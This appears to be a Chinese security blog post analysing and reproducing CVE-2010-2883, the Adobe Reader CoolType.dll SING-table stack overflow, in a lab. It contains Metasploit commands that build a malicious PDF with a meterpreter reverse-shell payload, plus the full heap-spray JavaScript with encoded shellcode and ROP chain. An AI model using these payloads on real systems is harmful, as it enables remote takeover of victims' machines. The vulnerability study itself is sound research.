<!--
	作者：Sariay
	时间：2018-08-26
	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head><meta name="generator" content="Hexo 3.9.0">
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      CVE-2010-2883分析复现 | Thriumph
    
  </title>
  <meta name="author" content="Thriumph">
  <meta name="keywords" content="pwn,re,渗透测试">
  <meta name="description" content="不将就、不妥协、不停留">
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">

  <!-- css -->
  <link rel="stylesheet" href="/css/Annie.css">
  
  <!-- jquery -->
	<script src="/plugin/jquery/jquery.min.js"></script>

<script>
    const CONFIG_BGIMAGE = {
      mode: 'normal',
      normalSrc: 'https://source.unsplash.com/collection/954550/1920x1080',
      randomYouMax: 110,
      randomYouSrc: '/',
	  randomOtherSrc: '/',
	  preloaderEnable: true
    }
	
    const CONFIG_LEACLOUD_COUNT = {
      enable: true,
	  appId: 'kL7JiFr2neE843z5adAoDHih-gzGzoHsz',
	  appKey: 'AsJ5lg1K8yyk6Rdo39i5dX1h',
	  serverURLs: 'http' || ' '
    }
  </script>
</head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="spinner">
					<div class="double-bounce1"></div>
					<div class="double-bounce2"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground bg-pan-br">
	<div class="mask">
		<!-- motto -->
		<div class="h-body">	
			
				<div class="motto text-shadow-pop-left">
					<p class="content" id="motto-content">获取中...</p>
					<p>-<p>
					<p class="author" id="motto-author">Just a minute...</p>
				</div>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more" class="scroll-down">
				<span class="icon-anchor1 animation-scroll-down"></span>
			</a>
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><span>0.0%</span></div>

	<div class="toc-switch"><span class="switch-button">目录</span></div>

	<!-- Page title -->
	<p>
		
			「CVE-2010-2883分析复现」
		
	</p>

	
	
		<span id="star-button" rel="unlike">
			<i class="icon-heart"></i>
		</span>
	

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<span class="logo"> 
			<img src="/img/logo.png">
		</span>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	
	<div class="nav-body">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	

	
</ul>
	</div>
	
	<div class="nav-footer">
		<ul id="global-social">
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-zhihu"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-github"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-sina-weibo "></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-pinterest2"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-instagram"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-twitter"></span>
			</a>
		</li>
	
		<li>
			<a href="/atom.xml" target="_blank">
				<span class="icon-rss"></span>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	时间：2018-11-17
	描述：
		插件名称：katelog.min.js
		插件作者：KELEN
		插件来源: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
			</div>
		</div>

		<script src="/plugin/toc/katelog.min.js"></script>

		
	 

<div class="layout-post">
	<div id="layout-post">
		<div class="article-title">
			
	<a href="/CVE-2010-2883分析复现.html" itemprop="url">
		CVE-2010-2883分析复现
	</a>

		</div>

		<div class="article-meta">
			<span>
				<i class="icon-calendar1"></i>
				
				




	更新于

	<a href="/CVE-2010-2883分析复现.html" itemprop="url">
		<time datetime="2019-12-31T16:02:03.000Z" itemprop="dateUpdated">
	  		2020-01-04
	  </time>
	</a> 



			</span>
			<span>
				
	<i class="icon-price-tags"></i>
	
		<a href="/tags/二进制安全/" class=" ">
			二进制安全
		</a>
	
		<a href="/tags/漏洞分析/" class=" ">
			漏洞分析
		</a>
	
		
			</span>
			
			

	
    <span class="leancloud_visitors" id="/CVE-2010-2883分析复现.html_visitors" data-url="/CVE-2010-2883分析复现.html" data-title="CVE-2010-2883分析复现">
       	<i class="icon-eye"></i>
       	热度
        
            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
                   
    </span>
    



	
    <span class="leancloud_likes" id="/CVE-2010-2883分析复现.html_likes" data-url="/CVE-2010-2883分析复现.html" data-title="CVE-2010-2883分析复现" rel="unlike">
        <i class="icon-heart"></i>
        喜欢
        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
    </span>
	

		</div>

		<div class="article-content" id="article-content">
			<p>CVE-2010-2883是pdf阅读器Adobe Reader的一个栈溢出漏洞。</p>
<a id="more"></a>
<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析文字文件SING表中的uniqueName时调用的strcat函数未检查长度存在的栈溢出漏洞，当用户打开特定的pdf文件就有可能导致任意代码执行。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Adobe Reader 8.2.4 - 9.3.4</p>
<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><table>
<thead>
<tr>
<th align="center">.</th>
<th align="center">环境</th>
</tr>
</thead>
<tbody><tr>
<td align="center">操作系统</td>
<td align="center">win xp(ip:192.168.17.143) kali2019(ip:192.168.17.145)</td>
</tr>
<tr>
<td align="center">虚拟机</td>
<td align="center">VMware 15</td>
</tr>
<tr>
<td align="center">调试器</td>
<td align="center">OllDbg</td>
</tr>
<tr>
<td align="center">反汇编器</td>
<td align="center">IDA7.0</td>
</tr>
<tr>
<td align="center">漏洞软件</td>
<td align="center">Adobe Reader 9.3.4</td>
</tr>
</tbody></table>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>1.进入msfconsole<br>2.搜索Adobe渗透模块<br><code>search adobe_cooltype_sing</code><br>3.调用渗透模块<br><code>use exploit/windows/fileformat/adobe_cooltype_sing/</code><br>4.查看模块详情<br><code>info</code><br>5.调用meterpreter载荷，反向连接到渗透机<br><code>set payload windows/meterpreter/reverse_tcp</code><br>6.设置Kali Linux的IP地址<br><code>set LHOST 192.168.17.145</code><br>7.设置本地监听端口<br><code>set LPORT 8888</code><br>8.设置带有后门程序的PDF文件<br><code>set FILENAME PINGINGLAB.pdf</code><br>9.执行生成文件,文件在/root/.msf4/local/PINGINGLAB.pdf<br><code>exploit</code><br>10.将PDF木马文件拷贝至Kali Linux桌面<br><code>cp /root/.msf4/local/PINGINGLAB.pdf /root/Desktop/PINGINGLAB.pdf</code><br>11.Metasploit开启shell监听会话，等待肉鸡上线<br>12.使用handler监听模块<br><code>use exploit/multi/handler</code><br>13.回弹一个tcp连接<br><code>set payload windows/meterpreter/reverse_tcp</code><br>14.设置监听IP地址<br><code>set LHOST 192.168.17.143</code><br>15.设置监听的端口<br><code>set LPORT 8888</code><br>16.开启监听<br><code>exploit</code><br>17.将PDF木马文件拷贝到Win xp并打开<br>这时Metasploit获取shell会话，并用Meterpreter控制肉鸡<br>查看系统信息<br>sysinfo<br>查看当前用户<br>getuid<br><img src="/CVE-2010-2883分析复现/1.png" alt></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="定位触发点"><a href="#定位触发点" class="headerlink" title="定位触发点"></a>定位触发点</h3><p>CoolType.dll（在安装目录Reader 9.0\Reader\下 ）在解析SING表中的uniqueName时存在栈溢出漏洞。用ida反汇编CoolType.dll库，查看字符串发现SING字样，这个地方是漏洞解析出错的地方，直接定位进去就能查看这个库对sing表格的解析方式，主要是stract造成的栈溢出。</p>
<p><img src="/CVE-2010-2883分析复现/2.png" alt></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0803</span>DBF2                 push    ebp</span><br><span class="line">.text:<span class="number">0803</span>DBF3                 sub     esp, <span class="number">104</span>h       ; 分配空间</span><br><span class="line">.text:<span class="number">0803</span>DBF9                 lea     ebp, [esp<span class="number">-4</span>]    ; <span class="built_in">strcat</span>将执行结果保存在ebp中</span><br><span class="line">.text:<span class="number">0803</span>DBFD                 mov     eax, ___security_cookie</span><br><span class="line">.text:<span class="number">0803</span>DC02                 xor     eax, ebp</span><br><span class="line">.text:<span class="number">0803</span>DC04                 mov     [ebp+<span class="number">108</span>h+var_4], eax</span><br><span class="line">.text:<span class="number">0803</span>DC0A                 push    <span class="number">4</span>Ch</span><br><span class="line">.text:<span class="number">0803</span>DC0C                 mov     eax, offset loc_81847C4</span><br><span class="line">.text:<span class="number">0803</span>DC11                 call    __EH_prolog3_catch</span><br><span class="line">.text:<span class="number">0803</span>DC16                 mov     eax, [ebp+<span class="number">108</span>h+arg_C]</span><br><span class="line">.text:<span class="number">0803</span>DC1C                 mov     edi, [ebp+<span class="number">108</span>h+arg_0]</span><br><span class="line">.text:<span class="number">0803</span>DC22                 mov     ebx, [ebp+<span class="number">108</span>h+arg_4]</span><br><span class="line">.text:<span class="number">0803</span>DC28                 mov     [ebp+<span class="number">108</span>h+var_130], edi</span><br><span class="line">.text:<span class="number">0803</span>DC2B                 mov     [ebp+<span class="number">108</span>h+var_138], eax</span><br><span class="line">.text:<span class="number">0803</span>DC2E                 call    sub_8041626</span><br><span class="line">.text:<span class="number">0803</span>DC33                 xor     esi, esi</span><br><span class="line">.text:<span class="number">0803</span>DC35                 cmp     dword ptr [edi+<span class="number">8</span>], <span class="number">3</span></span><br><span class="line">.text:<span class="number">0803</span>DC39 ;   <span class="keyword">try</span> &#123;</span><br><span class="line">.text:<span class="number">0803</span>DC39                 mov     [ebp+<span class="number">108</span>h+var_10C], esi</span><br><span class="line">.text:<span class="number">0803</span>DC3C                 jz      loc_803DDF9</span><br><span class="line">.text:<span class="number">0803</span>DC42                 mov     [ebp+<span class="number">108</span>h+var_124], esi</span><br><span class="line">.text:<span class="number">0803</span>DC45                 mov     [ebp+<span class="number">108</span>h+var_120], esi</span><br><span class="line">.text:<span class="number">0803</span>DC48                 cmp     dword ptr [edi+<span class="number">0</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0803</span>DC48 ;   &#125; <span class="comment">// starts at 803DC39</span></span><br><span class="line">.text:<span class="number">0803</span>DC4C ;   <span class="keyword">try</span> &#123;</span><br><span class="line">.text:<span class="number">0803</span>DC4C                 mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0803</span>DC50                 jnz     loc_803DDA2</span><br><span class="line">.text:<span class="number">0803</span>DC56                 push    offset aName    ; <span class="string">"name"</span></span><br><span class="line">.text:<span class="number">0803</span>DC5B                 push    edi             ; <span class="keyword">int</span></span><br><span class="line">.text:<span class="number">0803</span>DC5C                 lea     ecx, [ebp+<span class="number">108</span>h+var_124]</span><br><span class="line">.text:<span class="number">0803</span>DC5F                 mov     [ebp+<span class="number">108</span>h+var_119], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0803</span>DC63                 call    sub_802178F</span><br><span class="line">.text:<span class="number">0803</span>DC68                 cmp     [ebp+<span class="number">108</span>h+var_124], esi</span><br><span class="line">.text:<span class="number">0803</span>DC6B                 jnz     <span class="keyword">short</span> loc_803DCD6</span><br><span class="line">.text:<span class="number">0803</span>DC6D                 push    offset aSing    ; <span class="string">"SING"</span></span><br><span class="line">.text:<span class="number">0803</span>DC72                 push    edi             ; <span class="keyword">int</span></span><br><span class="line">.text:<span class="number">0803</span>DC73                 lea     ecx, [ebp+<span class="number">108</span>h+var_12C] ; 指向虚表的指针，这里指向sing表的入口</span><br><span class="line">.text:<span class="number">0803</span>DC76                 call    sub_8021ABE     ; 处理sing表</span><br><span class="line">.text:<span class="number">0803</span>DC7B                 mov     eax, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">.text:<span class="number">0803</span>DC7E                 cmp     eax, esi        ; 判断是否为空</span><br><span class="line">.text:<span class="number">0803</span>DC7E ;   &#125; <span class="comment">// starts at 803DC4C</span></span><br><span class="line">.text:<span class="number">0803</span>DC80 ;   <span class="keyword">try</span> &#123;</span><br><span class="line">.text:<span class="number">0803</span>DC80                 mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">2</span></span><br><span class="line">.text:<span class="number">0803</span>DC84                 jz      <span class="keyword">short</span> loc_803DCBD ; 不跳转</span><br><span class="line">.text:<span class="number">0803</span>DC86                 mov     ecx, [eax]      ; 版本号</span><br><span class="line">.text:<span class="number">0803</span>DC88                 <span class="keyword">and</span>     ecx, <span class="number">0F</span>FFFh</span><br><span class="line">.text:<span class="number">0803</span>DC8E                 jz      <span class="keyword">short</span> loc_803DC98 ; 跳转</span><br><span class="line">.text:<span class="number">0803</span>DC90                 cmp     ecx, <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">0803</span>DC96                 jnz     <span class="keyword">short</span> loc_803DCB9</span><br><span class="line">.text:<span class="number">0803</span>DC98</span><br><span class="line">.text:<span class="number">0803</span>DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+<span class="number">9</span>C↑j</span><br><span class="line">.text:<span class="number">0803</span>DC98                 add     eax, <span class="number">10</span>h        ; 寻找uniqueName，相对sing表入口偏移<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0803</span>DC9B                 push    eax             ; <span class="keyword">char</span> *</span><br><span class="line">.text:<span class="number">0803</span>DC9C                 lea     eax, [ebp+<span class="number">108</span>h+var_108] ; 目的地址是一段固定大小的栈空间，就是前面申请的空间</span><br><span class="line">.text:<span class="number">0803</span>DC9F                 push    eax             ; <span class="keyword">char</span> *</span><br><span class="line">.text:<span class="number">0803</span>DCA0                 mov     [ebp+<span class="number">108</span>h+var_108], <span class="number">0</span> </span><br><span class="line">.text:<span class="number">0803</span>DCA4                 call    <span class="built_in">strcat</span> ;造成溢出</span><br></pre></td></tr></table></figure>

<p><strong>strcat函数</strong><br>char * strcat(char * dest, const char * src);<br>strcat会将参数src字符串复制到参数dest所指的字符串尾部，dest最后的结束字符NULL会被覆盖掉，并在连接后的字符串尾部再增加一个NULL</p>
<h3 id="SING数据结构分析"><a href="#SING数据结构分析" class="headerlink" title="SING数据结构分析"></a>SING数据结构分析</h3><p>PdfStreamDumper，用工具导入利用漏洞的PDF文件，在Object中找到Sing的Object，右键选择Save Decompressed Streams保存到本地。<br>TableEntry数据结构在官方文档定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> sturct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];<span class="comment">//"SING"</span></span><br><span class="line">    ULONG checkSum;<span class="comment">//校验和</span></span><br><span class="line">    ULONG offset;<span class="comment">//相对文件偏移</span></span><br><span class="line">    ULONG length;<span class="comment">//数据长度</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>

<p>样本中，SING表的形态：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Char tag[<span class="number">4</span>];	 <span class="comment">//53 49 4E 47</span></span><br><span class="line">ULONG checkSum;  <span class="comment">//D9 BC C8 B5</span></span><br><span class="line">ULONG offset;	 <span class="comment">//00 00 01 1C</span></span><br><span class="line">ULONG length;	 <span class="comment">//00 00 1D DF</span></span><br></pre></td></tr></table></figure>

<p><img src="/CVE-2010-2883分析复现/3.png" alt></p>
<p>SING数据是0x11C开始的,SING数据长度为0x1DDF，SING从真实数据偏移0x10为uniqueName域,入口偏移0x11c是SING表的真实数据，也就是从00 00 01 00开始的部分偏移0x10就能找到uniqueName域(uniqueName域是个28字节大小的结构)，执行strcat后，会将58 E0 8D AD起始的复制到ebp指定的地址中，直到遇到NULL字符串终止符</p>
<h2 id="ollydbg动态调试"><a href="#ollydbg动态调试" class="headerlink" title="ollydbg动态调试"></a>ollydbg动态调试</h2><p>先打开Adobe Reader,再打开OllyDbg,attach上Adobe Reader进程，f9运行，此时OllyDbg显示当前调试的程序是运行状态，实际上这个时候Adobe Reader就已经加载了CoolType.dll文件了。通过刚刚的静态分析我们了解到SING在地址0803DC6D处被引用，Ctrl+G输入0x0803DC6D回车跳转到该地址F2下断点。</p>
<p><img src="/CVE-2010-2883分析复现/4.png" alt></p>
<h3 id="获取SING表的入口地址"><a href="#获取SING表的入口地址" class="headerlink" title="获取SING表的入口地址"></a>获取SING表的入口地址</h3><p>将样本拖入Adobe Reader中，程序就会停在刚才下的断点上面,f7单步运行到以下位置</p>
<p><img src="/CVE-2010-2883分析复现/5.png" alt></p>
<p>ECX指向0012EB00，数据窗口窗口跟随查看这个指针里存放的数据</p>
<p><img src="/CVE-2010-2883分析复现/6.png" alt></p>
<p><img src="/CVE-2010-2883分析复现/7.png" alt></p>
<p>在TrueType字体文件中，从0字节偏移的位置开始有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的说明了，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。075E3B70处的数据正好是0x00010000,所以此时ecx中保存的是SING的版本号。</p>
<p>之后调用call指令，将SING字符串当作参数了，这个call实际上是在处理SING表，f8步过，继续单步</p>
<p><img src="/CVE-2010-2883分析复现/8.png" alt></p>
<p><img src="/CVE-2010-2883分析复现/9.png" alt></p>
<p>eax是072f3924,用pdfStreamDumper取出PDF样本中的TTF文件,TTF中关于SING表的TableEntry结构数据如下图</p>
<p><img src="/CVE-2010-2883分析复现/10.png" alt></p>
<p>在文件偏移0x11C处即是SING表的真实数据</p>
<p><img src="/CVE-2010-2883分析复现/11.png" alt></p>
<p>这里的数据和eax所指的072F3924处的内容一样，所以call指令的作用是取SING表的入口地址。</p>
<p><img src="/CVE-2010-2883分析复现/12.png" alt></p>
<p>cmp eax,esi这里是比较eax和esi的值，检测SING是否为空，eax的值是072f3924，esi的值是0，所以不会跳转。继续向下执行</p>
<p><img src="/CVE-2010-2883分析复现/13.png" alt></p>
<p>mov ecx,dword ptr ds:[eax]这里的取出eax的内容赋给ecx（之前保存的是ttf的版本号）</p>
<p>and ecx,0xFFFF这里清掉低4位，结果为零，je跳转，继续往下</p>
<p><img src="/CVE-2010-2883分析复现/14.png" alt></p>
<p>这里执行add eax,0x10后，eax原来执行SING表，SING表加上0x10处指向unique域</p>
<p><img src="/CVE-2010-2883分析复现/15.png" alt></p>
<h3 id="找出溢出点"><a href="#找出溢出点" class="headerlink" title="找出溢出点"></a>找出溢出点</h3><p>继续执行找到溢出点</p>
<p><img src="/CVE-2010-2883分析复现/16.png" alt></p>
<p>将uniqueName域和当前的ebp入栈，然后调用strcat进行字符串拼接，但是没有进行安全检查，导致溢出，我们单步步过strcat后查看一下ebp开始的栈区数据</p>
<p><img src="/CVE-2010-2883分析复现/17.png" alt></p>
<p>此时栈溢出已经发生，函数的返回地址已经被覆盖为SING表中的恶意数据</p>
<p><img src="/CVE-2010-2883分析复现/18.png" alt></p>
<h3 id="返回地址"><a href="#返回地址" class="headerlink" title="返回地址"></a>返回地址</h3><p>返回地址位于icucnv32.dll中，IMAGE_OPTIONAL_HEADER中IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 的值为0，所以这个模块没有开启ASLR，这就保证了exp的稳定性</p>
<p><img src="/CVE-2010-2883分析复现/19.png" alt></p>
<p>执行到0x0808B1C0时，eax的值是0012E6D0,这个地址也是在icucnv32.dll中,f7跟进</p>
<p><img src="/CVE-2010-2883分析复现/20.png" alt></p>
<p>这里是ROP指令，首先执行add ebp,0x794 执行这条指令后ebp的值为0012E4DC</p>
<p><img src="/CVE-2010-2883分析复现/21.png" alt></p>
<p>ebp调整到strcat函数调用后的栈区数据范围内，接下来执行leave，修改了esp为0012E4E0</p>
<p><img src="/CVE-2010-2883分析复现/22.png" alt></p>
<p>执行retn会跳转到0x4A82A714地址处</p>
<p><img src="/CVE-2010-2883分析复现/23.png" alt></p>
<p>继续F7单步</p>
<p><img src="/CVE-2010-2883分析复现/24.png" alt></p>
<p>继续F7单步执行完pop esp后，esp将被修改为0x0C0C0C0C,然后返回</p>
<p><img src="/CVE-2010-2883分析复现/25.png" alt></p>
<h2 id="HeapSpray"><a href="#HeapSpray" class="headerlink" title="HeapSpray"></a>HeapSpray</h2><p>在进行HeapSpray时，一般会将EIP控制到0x0C0C0C0C，利用javascript申请大量的堆内存块，并用包含着0x90(nop)和shellcode的内存片覆盖这些内存。通常javascript会从内存低址向高址分配内存，因此申请的内存超过200MB(200MB=200x1024x1024=0xC800000&gt;0x0C0C0C0C)后，0x0C0C0C0C就会被含有shellcode的内存块覆盖。只要内存片中的0x90能够命中0x0C0C0C0C的位置，通过滑行，就可以执行到shellcode。而上图中的0x0C0C0C0C是样本特意构造的，是为了实现HeapSpary堆喷射技术，因为PDF本身支持执行JS的特性，将ShellCode借助JS写入内存中。栈中的数据就是JS代码中的ShellCode，然后利用它来实现ROP以绕过DEP保护。                   </p>
<p>可以通过PDFStreamDumper工具提取样本中实现堆喷射的JS代码，看到的代码是经过混淆的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var shellcode = unescape( &apos;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf&apos; );</span><br><span class="line">var block = unescape( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">while (block.length + 20 + 8 &lt; 65536) </span><br><span class="line">	block+=block;</span><br><span class="line">SP = block.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">SP += shellcode;</span><br><span class="line">SP += block;</span><br><span class="line">slackspace = SP.substring(0, 65536/2);</span><br><span class="line">while(slackspace.length &lt; 0x80000) //2^19=524288</span><br><span class="line">	slackspace += slackspace;</span><br><span class="line">bigblock = slackspace.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">var memory = new Array();</span><br><span class="line">for (count=0;count&lt;0x1f0;count++) </span><br><span class="line">	memory[count]=bigblock+&quot;s&quot;;</span><br></pre></td></tr></table></figure>

<p>平常的HeapSpray代码都是使用%u9090(NOP)进行填充，这里的%u0C0C相当于OR AL,0CH 这样的指令执行的效果对al寄存器不会产生任何影响，和后面的shellcode代码无关。NOP SLED在整个内存块中所占比例较大，所以当控制EIP转到0x0C0C0C0C执行时，命中NOP SLED的几率比较大。实现堆喷射的关键在new Array()，利用数据来开辟内存区域，然后通过填充数据的方式来喷射ShellCode</p>
<h2 id="利用ROP链绕过DEP保护"><a href="#利用ROP链绕过DEP保护" class="headerlink" title="利用ROP链绕过DEP保护"></a>利用ROP链绕过DEP保护</h2><p><img src="/CVE-2010-2883分析复现/26.png" alt></p>
<p>执行pop ecx ,ecx的值变成4A8A0000,储存UTF-32字符串</p>
<p><img src="/CVE-2010-2883分析复现/27.png" alt></p>
<p>继续执行，eax是0012E6D0</p>
<p><img src="/CVE-2010-2883分析复现/28.png" alt></p>
<p>执行完mov dword ptr:[ecx],eax后，原本存“UTF-32”字符串的地方保存eax的值</p>
<p><img src="/CVE-2010-2883分析复现/29.png" alt></p>
<p>之后返回，继续执行eax指向了CreateFileA</p>
<p><img src="/CVE-2010-2883分析复现/30.png" alt></p>
<p>跳转执行CreateFileA，查看CreateFileA在栈区的参数,这里以隐藏的方式创建了一个临时文件iso88591，可以在当前样本的同路径下找到</p>
<p><img src="/CVE-2010-2883分析复现/31.png" alt></p>
<p>Ctrl+F9返回</p>
<p><img src="/CVE-2010-2883分析复现/32.png" alt></p>
<p>继续执行跳转到0x4A8063A5</p>
<p><img src="/CVE-2010-2883分析复现/33.png" alt></p>
<p>执行pop ecx,将ecx赋值为4A801064</p>
<p><img src="/CVE-2010-2883分析复现/34.png" alt></p>
<p>执行ret，跳转到4A842DB2</p>
<p><img src="/CVE-2010-2883分析复现/35.png" alt></p>
<p>执行xchg eax,edi交换eax和edi寄存器的值</p>
